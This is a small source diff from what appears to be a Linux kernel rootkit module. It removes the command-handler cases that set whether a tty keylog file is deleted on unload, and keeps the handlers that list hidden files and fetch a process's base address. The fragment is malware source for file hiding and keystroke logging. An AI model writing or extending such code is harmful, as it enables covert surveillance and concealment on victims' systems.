@@ -532,12 +532,6 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
             /* show current hidden files/directories */
         } else if(!strcmp(buf, "-l")) {
             fs_list_names();
-            /* set tty log file to be removed on rmmod */
-        } else if (!strcmp(buf, "-t0")) {
-            kv_keylog_rm_log(true);
-            /* unset tty log file to be removed on rmmod */
-        } else if (!strcmp(buf, "-t1")) {
-            kv_keylog_rm_log(false);
             /* fetch base address of process */
         } else if (!strncmp(buf, "-b", MIN(2, size))) {
             char *tmp = &buf[3];
